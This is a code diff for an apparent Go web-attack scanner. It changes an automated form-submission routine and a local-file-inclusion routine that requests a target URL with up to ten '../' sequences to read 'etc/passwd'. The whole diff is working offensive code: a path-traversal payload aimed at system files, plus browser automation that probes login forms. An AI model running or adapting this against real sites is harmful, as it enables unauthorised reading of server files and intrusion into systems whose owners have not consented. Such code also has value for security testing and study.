@@ -14,6 +14,8 @@ import (
 )
 
 func attackInput(baseSub string, baseDomain string, n *html.Node) {
+	wg.Add(1)
+	defer wg.Done()
 	for _, attr := range n.Attr {
 		if attr.Key == "type" && attr.Val == "password" && !isAuthorised {
 			fmt.Println("[!] found password field on: " + baseDomain + "\nWant to use authorisation? Use the -a flag!")
@@ -25,12 +27,12 @@ func attackInput(baseSub string, baseDomain string, n *html.Node) {
 
 	ctx, cancel := chromedp.NewContext(
 		context.Background(),
-		// chromedp.WithDebugf(log.Printf),
+		//chromedp.WithDebugf(log.Printf),
 	)
 	defer cancel()
 
 	// create a timeout
-	ctx, cancel = context.WithTimeout(ctx, time.Second)
+	ctx, cancel = context.WithTimeout(ctx, 15*time.Second)
 	defer cancel()
 
 	// navigate to a page, wait for an element, click
@@ -41,7 +43,7 @@ func attackInput(baseSub string, baseDomain string, n *html.Node) {
 		// Load webpage
 		chromedp.WaitReady("body", chromedp.ByQuery),
 		// find and click "Example" link
-		chromedp.Click(`button[type="submit"]`),
+		chromedp.Click("//input[@type='submit']", chromedp.BySearch),
 	)
 	if err != nil {
 		if err != context.DeadlineExceeded {
@@ -51,7 +53,7 @@ func attackInput(baseSub string, baseDomain string, n *html.Node) {
 	}
 
 	// Button found, try to do more
-	fmt.Println("[!] submit button found at " + baseDomain)
+	//fmt.Println("[!] submit button found at " + baseDomain)
 }
 
 func setCookie(domain string) chromedp.ActionFunc {
@@ -78,6 +80,8 @@ func setCookie(domain string) chromedp.ActionFunc {
 }
 
 func attemptLFI(domain string, client *http.Client) {
+	wg.Add(1)
+	defer wg.Done()
 	index := strings.Index(domain, "=")
 	if index != -1 {
 		domain = domain[:index] + "="
@@ -101,7 +105,7 @@ func doLFI(domain string, client *http.Client, payload string) bool {
 		return true
 	}
 
-	for i := range 15 {
+	for i := range 10 {
 		resp, err := client.Get(domain + strings.Repeat("../", i) + "etc/passwd")
 		if err != nil {
 			fmt.Errorf(err.Error())
